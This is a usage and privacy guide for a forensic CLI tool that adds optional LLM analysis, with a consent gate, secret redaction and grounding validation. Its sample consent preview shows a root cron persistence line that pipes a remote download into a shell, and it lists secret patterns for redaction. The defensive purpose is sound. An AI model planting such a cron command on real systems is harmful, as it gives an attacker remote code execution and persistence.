# BHARYDANGEROUS-Investigator — AI Usage, Privacy & Provider Guide

**Author:** Ashim  
**Product:** BHARYDANGEROUS-Investigator (`bdinvestigator`)  

---

## 1. Overview

BHARYDANGEROUS-Investigator integrates optional Large Language Model (LLM) reasoning to assist forensic analysts in finding interpretation, incident summarization, timeline hypothesis generation, and verification recommendations.

Unlike tools that blindly forward sensitive forensic data to cloud APIs, BHARYDANGEROUS-Investigator implements an **air-gapped first, privacy-preserving, consent-gated architecture**.

---

## 2. Supported AI Providers

| Provider | Model Identifier | Execution Mode | Network Access | Requirements |
|---|---|---|---|---|
| **Google Gemini** | `gemini-2.5-flash` | Cloud API | Yes (HTTPS to Google Cloud) | `GEMINI_API_KEY` or `GOOGLE_API_KEY` |
| **Local Ollama** | Configurable (e.g. `llama3.2`, `mistral`) | Local Daemon | No (localhost `11434`) | Running Ollama service |
| **Mock Provider** | `mock-forensic-reasoner` | In-process | No (fully offline) | None (Default for CI/testing) |

---

## 3. Privacy & Data Handling Guarantee

For sensitive digital forensic investigations (classified networks, corporate incident response, HIPAA/GDPR-governed systems), BHARYDANGEROUS-Investigator enforces strict safeguards:

1. **Zero Automatic Transmissions:** AI analysis is never triggered automatically during evidence intake, triage, parsing, or timeline generation. It must be explicitly invoked via `bdinvestigator ai explain` or `bdinvestigator ai summarize`.
2. **Deterministic Independence:** All core forensic findings, IOCs, timeline events, and correlation results are produced 100% deterministically. AI is strictly an interpretive augmentation layer.
3. **Local-Only Operation:** Investigators handling confidential data can use **Local Ollama** or purely deterministic CLI commands. Zero bytes will leave the forensic workstation.
4. **Pre-Transmission Secret Redaction:** Prior to any preview or transmission, raw evidence strings are scrubbed of high-entropy secrets and sensitive identifiers:
   - Google / OpenAI / AWS API keys (`AIza...`, `sk-...`, `AKIA...`)
   - SSH and RSA Private Keys (`-----BEGIN RSA PRIVATE KEY-----`)
   - JSON Web Tokens (JWT) and OAuth Bearer tokens
   - Database connection strings containing passwords
   - Credit card numbers and sensitive PII patterns

---

## 4. The Interactive Consent Gate

Before any evidence excerpt is passed to an external API, BHARYDANGEROUS-Investigator presents an interactive consent modal:

```text
======================= AI TRANSMISSION PREVIEW =======================
Provider: Google Gemini (gemini-2.5-flash)
Target Finding: FND-b7a1e2 (Suspicious Cron Persistence)
Redacted Excerpt (bounded to 4096 chars):
-----------------------------------------------------------------------
File: /etc/cron.d/sync_service
Content: * * * * * root /bin/bash -c "curl -s http://198.51.100.12/update | sh"
Entropy: 4.82
Classification: Suspicious persistence script
-----------------------------------------------------------------------
Do you consent to transmitting this redacted excerpt to Google Gemini? [y/N]:
```

In non-interactive environments (e.g. automated CI pipelines or scripted workflows), transmission will be blocked unless the explicit `--consent` flag is provided.

---

## 5. Configuration & Setup

### Using Google Gemini
1. Obtain an API key from Google AI Studio.
2. Set the environment variable:
   ```bash
   # Linux / macOS
   export GEMINI_API_KEY="AIzaSyYourSecretKeyHere"

   # Windows PowerShell
   $env:GEMINI_API_KEY="AIzaSyYourSecretKeyHere"
   ```
3. Run an AI command:
   ```bash
   bdinvestigator ai explain FND-b7a1e2 --case-id CAS-001 --provider gemini
   ```

### Using Local Ollama
1. Install and run Ollama (`https://ollama.ai`).
2. Pull your desired forensic reasoning model:
   ```bash
   ollama run llama3.2
   ```
3. Run an AI command pointing to Ollama:
   ```bash
   bdinvestigator ai summarize --case-id CAS-001 --provider ollama --model llama3.2
   ```

### Using the Offline Mock Provider
When testing workflows, verifying CI builds, or demonstrating CLI reporting without credentials:
```bash
bdinvestigator ai explain FND-b7a1e2 --case-id CAS-001 --provider mock --consent
```

---

## 6. Grounding Validation & Hallucination Defense

Large Language Models may hallucinate non-existent evidence or be manipulated by prompt injections embedded inside evidence files. BHARYDANGEROUS-Investigator mitigates this through **Strict Grounding Validation**:

- Prompts strictly forbid the LLM from inventing finding identifiers or assuming unobserved events.
- All returned finding references (`finding_ids`) are validated by the `GroundingValidator` against the SQLite case database.
- Any finding ID mentioned by the model that does not exist in the authentic forensic case ledger is rejected and flagged as ungrounded.
- Reports clearly separate **Empirical Observations** (deterministic findings, file hashes, timestamps) from **AI Interpretations** (hypotheses and analytical explanations).
